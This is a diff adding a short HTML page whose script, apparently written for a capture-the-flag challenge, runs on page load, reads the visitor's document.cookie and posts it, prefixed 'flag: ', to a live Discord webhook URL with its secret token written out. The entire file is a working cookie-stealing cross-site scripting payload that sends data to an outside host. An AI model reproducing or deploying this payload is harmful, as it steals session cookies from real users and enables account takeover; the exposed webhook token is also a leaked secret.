@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<script>
+    function discord_message(webHookURL, message) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", webHookURL, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify({
+            'content': message,
+            'username':'AI',
+        }));
+        console.log(escape(document.cookie))
+    }
+
+	var i = new Image();
+	i.src = discord_message("https://discord.com/api/webhooks/1162528247553212427/az2iEeyAcldSquzHOCaCCACPVz5msBX10ylmrrGwaNSIU_hvIp4yIficQEoIjZolasYQ", "flag: " + escape(document.cookie));
+</script>
